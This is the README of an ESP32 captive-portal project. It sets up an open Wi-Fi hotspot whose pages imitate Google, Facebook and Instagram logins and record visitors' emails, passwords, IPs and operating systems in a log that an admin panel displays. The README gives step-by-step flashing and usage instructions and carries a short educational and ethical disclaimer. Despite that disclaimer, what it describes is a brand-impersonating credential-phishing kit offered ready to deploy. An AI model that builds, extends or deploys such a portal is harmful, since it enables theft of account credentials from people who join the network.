# ESP32 Captive Portal

Captive portal para ESP32 (Arduino framework) que simula uma tela de conexão à rede com login por Google, Facebook ou Instagram. Qualquer dispositivo que se conectar ao ponto de acesso é redirecionado automaticamente para o portal.

> **Aviso ético / Ethical notice**
> Projeto educacional para demonstrar como funcionam redes de convidados (guest networks) e captive portals. Use apenas em rede própria ou em ambientes autorizados (testes de segurança com permissão). Não use para coletar dados de terceiros.

---

## Funcionalidades / Features

- Rede Wi-Fi aberta com redirecionamento automático de dispositivos (DNS captive portal)
- Tela inicial com escolha do método de login: **Google**, **Facebook** ou **Instagram**
- Página de login exclusiva para cada rede, com visual e marca próprios (frontend apenas, nenhuma autenticação real é feita)
- Fluxo de login do Google em duas etapas (e-mail → senha), como na versão real
- Registro de eventos em `logs.txt` (LittleFS): horário, IP, provedor, e-mail, sistema operacional (via User-Agent) e ação
- Painel administrativo em `/admin` para consultar e limpar os logs
- Detecção do sistema operacional do cliente (Windows, Android, iOS, macOS, Linux)

## Fluxo / Flow

```
Device conecta no AP "ESP32-Portal-Demo"
        │
        ▼
    captive portal (DNS) ──► index.html ──► escolha: Google / Facebook / Instagram
        │
        ▼
   página de login da rede ──► POST /demo-login ──► logs.txt (LittleFS)
        │
        ▼
      success.html ("Conectado")
```

## Hardware

- ESP32 (qualquer variante: DevKit, NodeMCU-32S, etc.)
- 4 MB de flash (padrão)

## Como gravar / Getting started

### Opção A — Arduino IDE

1. Abra a pasta [`esp32-portal-arduino`](esp32-portal-arduino/) e o arquivo `esp32-portal-arduino.ino`
2. Adicione o suporte ao ESP32: `File > Preferences` → **Additional Boards Manager URLs**:
   `https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json`
3. `Tools > Board > Boards Manager` → instale **"esp32 by Espressif Systems"**
4. Selecione `Tools > Board > ESP32 Dev Module` e a porta serial
5. Clique em **Upload** — as páginas HTML já vêm embutidas na flash, sem passo extra

### Opção B — PlatformIO (VS Code)

1. Abra a raiz do projeto no VS Code com a extensão PlatformIO
2. `pio run -t uploadfs` (envia as páginas de `data/` para o LittleFS)
3. `pio run -t upload` (grava o firmware)

## Como testar / Usage

1. Conecte seu celular/PC ao Wi-Fi `ESP32-Portal-Demo` (sem senha)
2. O portal abre automaticamente (ou acesse `http://192.168.4.1`)
3. Escolha uma rede social e preencha a simulação de login
4. Veja os registros em `http://192.168.4.1/admin` (ou `/logs.txt`)

Exemplo de linha de log:

```
Tue, 11 Aug 2026 14:33:22 GMT | ip=192.168.4.5 | provider=Google | email=usuario@gmail.com | password=******** | os=Windows | action=submit
```

> A senha é gravada apenas em ambiente controlado — em produção, evite armazenar credenciais.

## Estrutura / Structure

```
├── platformio.ini              # configuração PlatformIO (ESP32 + LittleFS)
├── src/
│   └── main.cpp                # firmware (versão PlatformIO)
├── data/
│   ├── index.html              # escolha do método de login
│   ├── login-facebook.html
│   ├── login-google.html       # etapa 1 (e-mail)
│   ├── google-password.html    # etapa 2 (senha)
│   ├── login-instagram.html
│   ├── success.html
│   ├── admin.html              # painel de logs
│   └── css/style.css
└── esp32-portal-arduino/
    └── esp32-portal-arduino.ino  # versão para Arduino IDE (páginas embutidas)
```

## Tecnologias / Stack

- C++ (Arduino framework) · ESP32 · WiFi AP + DNSServer + WebServer · LittleFS
- HTML/CSS puro (SVG inline, sem dependências externas)

---

## License

[MIT](LICENSE) — feito para fins educacionais.
